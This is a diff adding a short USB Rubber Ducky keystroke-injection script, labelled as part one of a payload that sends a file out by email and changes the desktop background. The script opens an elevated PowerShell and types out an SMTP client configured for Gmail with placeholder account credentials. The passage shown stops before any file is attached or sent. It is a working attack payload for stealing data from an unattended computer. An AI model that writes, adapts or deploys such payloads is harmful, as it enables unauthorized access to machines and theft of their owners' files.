@@ -1,0 +1,22 @@
+REM Email File Part 1 of script to export a file out via email and set a background image
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 500
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL ADDRESS@gmail.com', 'PASSWORD');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 2000
+STRING $ReportEmail.From = 'EMAIL ADDRESS@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('EMAIL ADDRESS@gmail.com')
+ENTER
